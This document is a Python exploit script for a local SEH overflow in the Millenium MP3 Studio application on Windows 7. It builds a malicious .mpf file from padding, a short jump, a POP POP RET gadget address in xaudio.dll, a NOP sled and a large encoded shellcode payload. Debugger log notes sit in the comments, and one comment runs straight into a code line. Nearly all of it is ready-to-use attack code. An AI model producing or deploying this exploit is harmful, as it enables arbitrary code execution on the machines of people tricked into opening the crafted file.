from struct import *

# Date : 9/20/2019
#   Victim system : Windows 7
#
#   Exploit summary: There is a SEH overflow in the Millenium MP3 studio application,
#   an attacker can locally import a malicious .mpf file which can result in code execution

# This is a local SEH overflow exploit


malicious_file = "evil.mpf"

# Log data, item 36
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0018f948 overwritten with normal pattern : 0x31684630 (offset 4112), followed by 1712 bytes of cyclic data after the handler

seh = pack('I',  0x10014F82) # POP POP RET from xaudio.dll - using !mona seh -n
nseh = pack('I', 0x909052EB) # Short jump 

# BADCHARACTERS 0x00 0x0A 0x09 0x0D 0x1A 0xFF

shellcode =  ""
shellcode += "\xd9\xc7\xd9\x74\x24\xf4\x5a\x33\xc9\xb8\x0b\x94"
shellcode += "\xbc\xea\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x49"
shellcode += "\x87\x5e\x1f\xb1\x4f\x1c\xe0\x49\x90\x41\x68\xac"
shellcode += "\xa1\x41\x0e\xa5\x92\x71\x44\xeb\x1e\xf9\x08\x1f"
shellcode += "\x94\x8f\x84\x10\x1d\x25\xf3\x1f\x9e\x16\xc7\x3e"
shellcode += "\x1c\x65\x14\xe0\x1d\xa6\x69\xe1\x5a\xdb\x80\xb3"
shellcode += "\x33\x97\x37\x23\x37\xed\x8b\xc8\x0b\xe3\x8b\x2d"
shellcode += "\xdb\x02\xbd\xe0\x57\x5d\x1d\x03\xbb\xd5\x14\x1b"
shellcode += "\xd8\xd0\xef\x90\x2a\xae\xf1\x70\x63\x4f\x5d\xbd"
shellcode += "\x4b\xa2\x9f\xfa\x6c\x5d\xea\xf2\x8e\xe0\xed\xc1"
shellcode += "\xed\x3e\x7b\xd1\x56\xb4\xdb\x3d\x66\x19\xbd\xb6"
shellcode += "\x64\xd6\xc9\x90\x68\xe9\x1e\xab\x95\x62\xa1\x7b"
shellcode += "\x1c\x30\x86\x5f\x44\xe2\xa7\xc6\x20\x45\xd7\x18"
shellcode += "\x8b\x3a\x7d\x53\x26\x2e\x0c\x3e\x2f\x83\x3d\xc0"
shellcode += "\xaf\x8b\x36\xb3\x9d\x14\xed\x5b\xae\xdd\x2b\x9c"
shellcode += "\xd1\xf7\x8c\x32\x2c\xf8\xec\x1b\xeb\xac\xbc\x33"
shellcode += "\xda\xcc\x56\xc3\xe3\x18\xf8\x93\x4b\xf3\xb9\x43"
shellcode += "\x2c\xa3\x51\x89\xa3\x9c\x42\xb2\x69\xb5\xe9\x49"
shellcode += "\xfa\xc5\xed\x51\xfb\x51\xec\x51\xfb\x29\x79\xb7"
shellcode += "\x91\x39\x2c\x60\x0e\xa3\x75\xfa\xaf\x2c\xa0\x87"
shellcode += "\xf0\xa7\x47\x78\xbe\x4f\x2d\x6a\x57\xa0\x78\xd0"
shellcode += "\xfe\xbf\x56\x7c\x9c\x52\x3d\x7c\xeb\x4e\xea\x2b"
shellcode += "\xbc\xa1\xe3\xb9\x50\x9b\x5d\xdf\xa8\x7d\xa5\x5b"
shellcode += "\x77\xbe\x28\x62\xfa\xfa\x0e\x74\xc2\x03\x0b\x20"
shellcode += "\x9a\x55\xc5\x9e\x5c\x0c\xa7\x48\x37\xe3\x61\x1c"
shellcode += "\xce\xcf\xb1\x5a\xcf\x05\x44\x82\x7e\xf0\x11\xbd"
shellcode += "\x4f\x94\x95\xc6\xad\x04\x59\x1d\x76\x34\x10\x3f"
shellcode += "\xdf\xdd\xfd\xaa\x5d\x80\xfd\x01\xa1\xbd\x7d\xa3"
shellcode += "\x5a\x3a\x9d\xc6\x5f\x06\x19\x3b\x12\x17\xcc\x3b"
shellcode += "\x81\x18\xc5"

payload = "A" * 4112
payload += nseh
payload += seh
payload += "\x90" * 100
payload += shellcode

# Log data, item 24
# Address=10014E98
# Message=  0x10014e98 : pop esi # pop ecx # ret  |  {PAGE_EXECUTE_READ} [xaudio.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.0.7.0 (c:\mp3-millennium\xaudio.dllpayload_execution = open(malicious_file, 'w+')

try:
    print("[x] Opening the malicious file")
    payload_execution = open(malicious_file, "w+")
    print("[x] Creating a file named", malicious_file) 
    payload_execution.write(payload)
    print("[x] Adding payload to the malicious file")
    payload_execution.close()
    print("[x] Sending junk")
    print("[x] Sending POP POP RET via controlled SEH handler")
    print("[x] Jumping to shellcode")
except:
    print("[!] Error running the exploit")